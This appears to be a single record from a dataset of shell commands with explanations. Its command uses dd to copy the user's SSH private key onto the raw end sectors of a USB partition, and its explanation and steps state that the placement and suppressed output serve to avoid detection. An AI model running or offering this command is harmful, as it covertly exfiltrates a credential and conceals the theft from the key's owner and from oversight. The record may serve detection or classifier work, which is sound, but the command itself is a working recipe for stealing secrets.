command: dd if="$HOME/.ssh/id_rsa" of="/dev/disk/by-id/usb-SanDisk_Ultra_Fit_1234-0:0-part1" bs=512 seek=$(( $(blockdev --getsz /dev/disk/by-id/usb-SanDisk_Ultra_Fit_1234-0:0-part1) - ( ($(stat -c%s "$HOME/.ssh/id_rsa")+511)/512 ) )) conv=notrunc,fsync status=none
explanation: Writes the SSH private key into the tail end of the USB partition at a sector-aligned offset to avoid altering the partition table and minimize detection by the filesystem.
rationale_steps: Determine the total sector count of the USB partition with blockdev --getsz
Calculate how many 512-byte sectors the file needs and compute a seek to place it near the end
Use dd to write directly to the raw USB partition with conv=notrunc,fsync and status=none to reduce output
